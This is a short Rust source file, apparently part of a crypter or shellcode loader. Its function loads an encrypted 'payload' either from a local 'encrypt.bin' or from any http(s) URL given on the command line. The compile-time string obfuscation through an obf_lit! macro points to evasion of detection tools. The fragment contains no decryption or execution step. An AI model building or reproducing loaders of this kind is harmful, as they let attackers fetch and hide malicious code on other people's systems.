use std::env;
use rustcrypt_ct_macros::obf_lit;

pub fn load_payload() -> Result<Vec<u8>, Box<dyn std::error::Error>> {
    let args: Vec<String> = env::args().collect();
    let address = if args.len() < 2 || args[1].is_empty() {
        obf_lit!("encrypt.bin").to_string()
    } else {
        args[1].clone()
    };
    if address.starts_with("http://") || address.starts_with("https://") {
        // Remote loading
        let response = reqwest::blocking::get(&address)?;
        if !response.status().is_success() {
            return Err(format!("{} {}", obf_lit!("HTTP request failed with status:"), response.status()).into());
        }
        Ok(response.bytes()?.to_vec())
    } else {
        // Local file loading
        Ok(std::fs::read(&address)?)
    }
}